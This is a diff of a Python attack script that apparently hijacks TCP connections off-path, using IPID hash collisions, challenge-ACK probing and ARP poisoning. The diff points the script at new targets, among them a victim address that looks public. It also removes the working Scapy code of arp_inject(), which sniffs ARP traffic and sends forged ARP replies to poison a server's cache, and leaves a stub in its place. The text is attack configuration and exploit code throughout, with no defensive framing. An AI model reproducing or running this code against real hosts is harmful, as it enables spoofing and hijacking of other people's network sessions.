@@ -38,9 +38,9 @@ from Final.webscoket_gen import get_websocket_messege
                     2020/3/18    Kevin.F:    change int convert for python 3
                     2020/3/18    Kevin.F:    Add icmp id filter equation
 """
-forge_ip = '10.10.16.92'                    # hash collision IP (get form collision_find.py)
-victim_ip = '10.10.100.1'                   # victim ip address
-server_ip = '10.10.100.2'                   # server ip address
+forge_ip = '10.10.15.86'                    # hash collision IP (get form collision_find.py)
+victim_ip = '182.92.129.182'                # victim ip address
+server_ip = '172.21.0.16'                   # server ip address
 server_port = 3000                          # known server port (e.g. ssh:22 BGP:179 Rocket.Chat:3000)
 client_port = 45546                         # found client port
 
@@ -50,8 +50,8 @@ ack_left_bound = -1                         # left bound of challenge-ack-window
 ack_in_win = -1                             # acceptable ack number
 seq_num = -1                                # exact sequence number
 
-server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
-my_if_name= 'ens33'                         # bind one ethernet interface
+server_mac_addr = '52:54:00:df:b4:7e'       # mac address of server used for ARP poison
+my_if_name= 'eth0'                          # bind one ethernet interface
 my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
 z_payload = b''                             # full-zero byte string used for padding
 
@@ -73,22 +73,7 @@ finish = False                              # exit?
                 IP address which can cause IPID counter hash collision. 
 """
 def arp_inject():
-    forged_ip = forge_ip
-    # here we send a UDP packet to allure server to execute ip/mac convert
-    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
-                iface=my_if_name, timeout=0.5, count=1, started_callback=
-                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
-                             iface=my_if_name, verbose=False))
-
-    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
-        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
-             iface=my_if_name, verbose=False)
-
-    time.sleep(1)
-
-    if not finish:
-        ts = threading.Thread(target=arp_inject)
-        ts.start()
+    return
 
 
 """
